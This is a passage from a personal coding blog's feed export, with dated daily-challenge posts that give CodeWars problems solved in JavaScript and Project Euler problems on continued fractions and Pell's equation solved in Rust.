class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">    .filter(<span class="function"><span class="params">a</span> =&gt;</span> a&amp;<span class="number">1</span>)</span><br><span class="line">    .length&lt;<span class="number">2</span>?</span><br><span class="line">    integers.find(<span class="function"><span class="params">a</span> =&gt;</span> a&amp;<span class="number">1</span>):</span><br><span class="line">    integers.find(<span class="function"><span class="params">a</span> =&gt;</span> ~a&amp;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeWars </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-26 Daily Challenge</title>
      <link href="/2019-02-26-Daily-Challenge/"/>
      <url>/2019-02-26-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is and <em>Vowel Count</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="CodeWars"><a href="#CodeWars" class="headerlink" title="CodeWars"></a>CodeWars</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Vowel-Count"><a href="#Vowel-Count" class="headerlink" title="Vowel Count"></a>Vowel Count</h3><p>Return the number (count) of vowels in the given string.</p><p>We will consider a, e, i, o, and u as vowels for this Kata.</p><p>The input string will only consist of lower case letters and/or spaces.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCount</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (str.match(<span class="regexp">/[aeiou]/gi</span>)||[]).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCount</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/[^aeiou]/gi</span>, <span class="string">""</span>).length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeWars </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-25 Daily Challenge</title>
      <link href="/2019-02-25-Daily-Challenge/"/>
      <url>/2019-02-25-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is and <em>Find the divisors!</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="CodeWars"><a href="#CodeWars" class="headerlink" title="CodeWars"></a>CodeWars</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Find-the-divisors"><a href="#Find-the-divisors" class="headerlink" title="Find the divisors!"></a>Find the divisors!</h3><p>Create a function named <code>divisors</code>/<code>Divisors</code> that takes an integer <code>n &gt; 1</code> and returns an array with all of the integer&#39;s divisors(except for 1 and the number itself), from smallest to largest. If the number is prime return the string &#39;(integer) is prime&#39; (<code>null</code> in C#) (use <code>Either String a</code> in Haskell and <code>Result&lt;Vec&lt;u32&gt;, String&gt;</code> in Rust).</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">divisors(<span class="number">12</span>); <span class="comment">// should return [2,3,4,6]</span></span><br><span class="line">divisors(<span class="number">25</span>); <span class="comment">// should return [5]</span></span><br><span class="line">divisors(<span class="number">13</span>); <span class="comment">// should return "13 is prime"</span></span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">divisors</span>(<span class="params">integer</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">Array</span>.apply(<span class="literal">null</span>, &#123;<span class="attr">length</span>: <span class="built_in">Math</span>.ceil((integer+<span class="number">1</span>)/<span class="number">2</span>)&#125;).map(<span class="built_in">Number</span>.call, <span class="built_in">Number</span>).slice(<span class="number">2</span>).filter(<span class="function"><span class="params">x</span> =&gt;</span> integer % x===<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> s.length?s:<span class="string">`<span class="subst">$&#123;integer&#125;</span> is prime`</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeWars </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-24 Daily Challenge</title>
      <link href="/2019-02-24-Daily-Challenge/"/>
      <url>/2019-02-24-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Diophantine equation</em> in <em>Rust</em> and <em>Printer Errors</em> in <em>JavaScript</em>.</p><p>BTW, I found math became more and more difficult, far more than I&#39;ve expected. I decided to learn some practical course before returning to math.</p><p>So there will be only CodeWars after today~</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Diophantine-equation"><a href="#Diophantine-equation" class="headerlink" title="Diophantine equation"></a>Diophantine equation</h3><h3 id="Problem-66"><a href="#Problem-66" class="headerlink" title="Problem 66"></a>Problem 66</h3><p>Consider quadratic Diophantine equations of the form:</p><p><em>x</em>2 – D<em>y</em>2 = 1</p><p>For example, when D=13, the minimal solution in <em>x</em> is 6492 – 13×1802 = 1.</p><p>It can be assumed that there are no solutions in positive integers when D is square.</p><p>By finding minimal solutions in <em>x</em> for D = {2, 3, 5, 6, 7}, we obtain the following:</p><p>$3^2 – 2×2^2 = 1$<br>$2^2 – 3×1^2 = 1$<br>$9^2 – 5×4^2 = 1$<br>$5^2 – 6×2^2 = 1$<br>$8^2 – 7×3^2 = 1$</p><p>Hence, by considering minimal solutions in <em>x</em> for D ≤ 7, the largest <em>x</em> is obtained when D=5.</p><p>Find the value of D ≤ 1000 in minimal solutions of <em>x</em> for which the largest value of <em>x</em> is obtained.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Thanks to</p><ul><li><a href="https://math.stackexchange.com/questions/1045127/how-to-find-a-fundamental-solution-to-pells-equation" target="_blank" rel="noopener">How to find a fundamental solution to Pell&#39;s equation? - Mathematics Stack Exchange</a></li><li><a href="https://en.wikipedia.org/wiki/Pell%27s_equation#Solutions" target="_blank" rel="noopener">Pell&#39;s equation - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Continued_fraction_expansion" target="_blank" rel="noopener">Methods of computing square roots</a></li></ul><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_integer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::BigInt;</span><br><span class="line"><span class="keyword">use</span> num_traits::&#123;Zero, One, FromPrimitive&#125;;</span><br><span class="line"><span class="keyword">use</span> num_integer::Roots;</span><br><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"><span class="keyword">use</span> std::mem::&#123;replace, swap&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: BigInt = Zero::zero();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1u64</span>..<span class="number">1001</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = pell_equation(i);</span><br><span class="line">        <span class="keyword">if</span> tmp &gt; ans &#123;</span><br><span class="line">            replace(&amp;<span class="keyword">mut</span> ans, tmp);</span><br><span class="line">            index = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">pell_equation</span></span>(d: <span class="built_in">u64</span>) -&gt; BigInt &#123;</span><br><span class="line">    <span class="keyword">let</span> root = d.sqrt();</span><br><span class="line">    <span class="keyword">if</span> root * root == d &#123;</span><br><span class="line">        <span class="keyword">return</span> Zero::zero();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> dd: BigInt = FromPrimitive::from_u64(d).unwrap();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> extra = root;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> extras: <span class="built_in">Vec</span>&lt;<span class="built_in">u64</span>&gt; = <span class="built_in">vec!</span>[];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> numerator = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> denominator = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        extras.push(extra);</span><br><span class="line">        numerator = denominator * extra - numerator;</span><br><span class="line">        <span class="keyword">if</span> (d - numerator * numerator) % denominator != <span class="number">0</span> &amp;&amp; (root + numerator) % denominator != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="built_in">panic!</span>(<span class="string">"???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        denominator = (d - numerator * numerator) / denominator;</span><br><span class="line">        extra = (root + numerator) / denominator;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> denominator: BigInt = Zero::zero();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> numerator: BigInt = One::one();</span><br><span class="line">        <span class="comment">// println!("&#123;:?&#125;", extras);</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">0</span>..extras.len()).rev() &#123;</span><br><span class="line">            <span class="keyword">let</span> mul: BigInt = FromPrimitive::from_u64(extras[i]).unwrap();</span><br><span class="line">            denominator = mul * &amp;numerator + &amp;denominator;</span><br><span class="line">            swap(&amp;<span class="keyword">mut</span> numerator, &amp;<span class="keyword">mut</span> denominator);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// println!("&#123;&#125;/&#123;&#125;", numerator.to_str_radix(10), denominator.to_str_radix(10));</span></span><br><span class="line">        <span class="keyword">let</span> tmp = &amp;numerator * &amp;numerator - &amp;dd * &amp;denominator * &amp;denominator;</span><br><span class="line">        <span class="keyword">if</span> tmp == One::one() &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"&#123;&#125;, &#123;&#125;, &#123;&#125;"</span>,d, numerator, denominator);</span><br><span class="line">            <span class="keyword">return</span> numerator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CodeWars"><a href="#CodeWars" class="headerlink" title="CodeWars"></a>CodeWars</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Printer-Errors"><a href="#Printer-Errors" class="headerlink" title="Printer Errors"></a>Printer Errors</h3><p>In a factory a printer prints labels for boxes. For one kind of boxes the printer has to use colors which, for the sake of simplicity, are named with letters from <code>a to m</code>.</p><p>The colors used by the printer are recorded in a control string. For example a &quot;good&quot; control string would be <code>aaabbbbhaijjjm</code> meaning that the printer used three times color a, four times color b, one time color h then one time color a...</p><p>Sometimes there are problems: lack of colors, technical malfunction and a &quot;bad&quot; control string is produced e.g. <code>aaaxbbbbyyhwawiwjjjwwm</code> with letters not from <code>a to m</code>.</p><p>You have to write a function <code>printer_error</code> which given a string will output the error rate of the printer as a <strong>string</strong> representing a rational whose numerator is the number of errors and the denominator the length of the control string. Don&#39;t reduce this fraction to a simpler expression.</p><p>The string has a length greater or equal to one and contains only letters from <code>a</code>to <code>z</code>.</p><p>#Examples:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=&quot;aaabbbbhaijjjm&quot;</span><br><span class="line">error_printer(s) =&gt; &quot;0/14&quot;</span><br><span class="line"></span><br><span class="line">s=&quot;aaaxbbbbyyhwawiwjjjwwm&quot;</span><br><span class="line">error_printer(s) =&gt; &quot;8/22&quot;</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printerError</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;[...s].map(a=&gt;a.charCodeAt(<span class="number">0</span>)&gt;<span class="number">109</span>).reduce((a, b)=&gt;a+b)&#125;</span>/<span class="subst">$&#123;s.length&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printerError</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;[...s].filter(a=&gt;a.charCodeAt(<span class="number">0</span>)&gt;<span class="number">109</span>).length&#125;</span>/<span class="subst">$&#123;s.length&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printerError</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;s.replace(<span class="regexp">/[a-m]/gi</span>, <span class="string">""</span>).length&#125;</span>/<span class="subst">$&#123;s.length&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> ProjectEuler </tag>
            
            <tag> CodeWars </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-23 Daily Challenge</title>
      <link href="/2019-02-23-Daily-Challenge/"/>
      <url>/2019-02-23-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Convergents of e</em> in <em>Rust</em> and <em>Sum of two lowest positive integers</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Convergents-of-e"><a href="#Convergents-of-e" class="headerlink" title="Convergents of e"></a>Convergents of e</h3><h3 id="Problem-65"><a href="#Problem-65" class="headerlink" title="Problem 65"></a>Problem 65</h3><p>The square root of 2 can be written as an infinite continued fraction.</p><img src="/2019-02-23-Daily-Challenge/1.png"><p>The infinite continued fraction can be written, √2 = [1;(2)], (2) indicates that 2 repeats <em>ad infinitum</em>. In a similar way, √23 = [4;(1,3,1,8)].</p><p>It turns out that the sequence of partial values of continued fractions for square roots provide the best rational approximations. Let us consider the convergents for √2.</p><img src="/2019-02-23-Daily-Challenge/2.png"><p>Hence the sequence of the first ten convergents for √2 are:</p><p>1, 3/2, 7/5, 17/12, 41/29, 99/70, 239/169, 577/408, 1393/985, 3363/2378, ...</p><p>What is most surprising is that the important mathematical constant,<br><em>e</em> = [2; 1,2,1, 1,4,1, 1,6,1 , ... , 1,2<em>k</em>,1, ...].</p><p>The first ten terms in the sequence of convergents for <em>e</em> are:</p><p>2, 3, 8/3, 11/4, 19/7, 87/32, 106/39, 193/71, 1264/465, 1457/536, ...</p><p>The sum of digits in the numerator of the 10th convergent is 1+4+5+7=17.</p><p>Find the sum of digits in the numerator of the 100th convergent of the continued fraction for <em>e</em>.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Thanks to <a href="https://oeis.org/A113873" target="_blank" rel="noopener">OEIS</a>......</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::BigUint;</span><br><span class="line"><span class="keyword">use</span> num_traits::FromPrimitive;</span><br><span class="line"><span class="keyword">use</span> std::mem::replace;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> a0: BigUint = FromPrimitive::from_u64(<span class="number">1</span>).unwrap();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> a1: BigUint = FromPrimitive::from_u64(<span class="number">1</span>).unwrap();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">100</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span> || i % <span class="number">3</span> == <span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> a2 = a0 + &amp;a1;</span><br><span class="line">            a0 = replace(&amp;<span class="keyword">mut</span> a1, a2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> n: BigUint = FromPrimitive::from_u64((i / <span class="number">3</span> + <span class="number">1</span>) * <span class="number">2</span>).unwrap();</span><br><span class="line">            <span class="keyword">let</span> a2 = n * &amp;a1 + &amp;a0;</span><br><span class="line">            a0 = replace(&amp;<span class="keyword">mut</span> a1, a2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> ans = a1.to_str_radix(<span class="number">10</span>).chars()</span><br><span class="line">                .map(|x| x <span class="keyword">as</span> <span class="built_in">i32</span> - <span class="string">'0'</span> <span class="keyword">as</span> <span class="built_in">i32</span>)</span><br><span class="line">                .fold(<span class="number">0</span>, |a, b| a+b);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Sum-of-two-lowest-positive-integers"><a href="#Sum-of-two-lowest-positive-integers" class="headerlink" title="Sum of two lowest positive integers"></a>Sum of two lowest positive integers</h3><p>Create a function that returns the sum of the two lowest positive numbers given an array of minimum 4 integers. No floats or empty arrays will be passed.</p><p>For example, when an array is passed like <code>[19, 5, 42, 2, 77]</code>, the output should be <code>7</code>.</p><p><code>[10, 343445353, 3453445, 3453545353453]</code> should return <code>3453455</code>.</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sumTwoSmallestNumbers</span>(<span class="params">numbers</span>) </span>&#123;  </span><br><span class="line">  numbers.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a-b);</span><br><span class="line">  <span class="keyword">return</span> numbers[<span class="number">0</span>]+numbers[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sumTwoSmallestNumbers = <span class="function">(<span class="params">numbers</span>) =&gt;</span> </span><br><span class="line">  numbers</span><br><span class="line">    .sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a-b)</span><br><span class="line">    .slice(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a+b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sumTwoSmallestNumbers = <span class="function">(<span class="params">numbers</span>) =&gt;</span> </span><br><span class="line">  numbers</span><br><span class="line">    .reduce(</span><br><span class="line">      (a, b) =&gt; [...a, b].sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a-b).slice(<span class="number">0</span>, <span class="number">2</span>), </span><br><span class="line">      [<span class="built_in">Number</span>.MAX_SAFE_INTEGER, <span class="built_in">Number</span>.MAX_SAFE_INTEGER]</span><br><span class="line">    )</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a+b);</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> ProjectEuler </tag>
            
            <tag> CodeWars </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-22 Daily Challenge</title>
      <link href="/2019-02-22-Daily-Challenge/"/>
      <url>/2019-02-22-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>I&#39;ve get tired with leetcode, especially meet strange runtime at yesterday. So I jumped into codewors and want to learn some fp and ES6 from Space :D</p><p>What I&#39;ve done today is <em>Odd period square roots</em> in <em>Rust</em> and <em>Jaden Casing Strings</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Odd-period-square-roots"><a href="#Odd-period-square-roots" class="headerlink" title="Odd period square roots"></a>Odd period square roots</h3><h3 id="Problem-64"><a href="#Problem-64" class="headerlink" title="Problem 64"></a>Problem 64</h3><p>All square roots are periodic when written as continued fractions and can be written in the form:</p><img src="/2019-02-22-Daily-Challenge/1.png"><p>For example, let us consider √23:</p><img src="/2019-02-22-Daily-Challenge/2.png"><p>If we continue we would get the following expansion:</p><img src="/2019-02-22-Daily-Challenge/3.png"><p>The process can be summarised as follows:</p><img src="/2019-02-22-Daily-Challenge/4.png"><p>It can be seen that the sequence is repeating. For conciseness, we use the notation √23 = [4;(1,3,1,8)], to indicate that the block (1,3,1,8) repeats indefinitely.</p><p>The first ten continued fraction representations of (irrational) square roots are:</p><p>√2=[1;(2)], period=1<br>√3=[1;(1,2)], period=2<br>√5=[2;(4)], period=1<br>√6=[2;(2,4)], period=2<br>√7=[2;(1,1,1,4)], period=4<br>√8=[2;(1,4)], period=2<br>√10=[3;(6)], period=1<br>√11=[3;(3,6)], period=2<br>√12= [3;(2,6)], period=2<br>√13=[3;(1,1,1,1,6)], period=5</p><p>Exactly four continued fractions, for N ≤ 13, have an odd period.</p><p>How many continued fractions for N ≤ 10000 have an odd period?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I &quot;borrow&quot; something from wikipedia but don&#39;t get it known...</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10001</span> &#123;</span><br><span class="line">        ans += get_period(i) &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">get_period</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> root = (n <span class="keyword">as</span> <span class="built_in">f64</span>).sqrt() <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">if</span> root * root == n &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> extra = root;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> numerator = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> denominator = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> period = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> extra != <span class="number">2</span> * root &#123;</span><br><span class="line">        numerator = denominator * extra - numerator;</span><br><span class="line">        <span class="keyword">if</span> (n - numerator * numerator) % denominator != <span class="number">0</span> &amp;&amp; (root + numerator) % denominator != <span class="number">0</span> &#123;</span><br><span class="line">            <span class="built_in">panic!</span>(<span class="string">"???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        denominator = (n - numerator * numerator) / denominator;</span><br><span class="line">        extra = (root + numerator) / denominator;</span><br><span class="line">        period += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    period</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Codewar"><a href="#Codewar" class="headerlink" title="Codewar"></a>Codewar</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Jaden-Casing-Strings"><a href="#Jaden-Casing-Strings" class="headerlink" title="Jaden Casing Strings"></a>Jaden Casing Strings</h3><ul><li><p>Jaden Smith, the son of Will Smith, is the star of films such as The Karate Kid (2010) and After Earth (2013). Jaden is also known for <a href="https://twitter.com/officialjaden" target="_blank" rel="noopener">some of his philosophy that he delivers via Twitter</a>. When writing on Twitter, he is known for almost always capitalizing every word.</p><p>Your task is to convert strings to how they would be written by Jaden Smith. The strings are actual 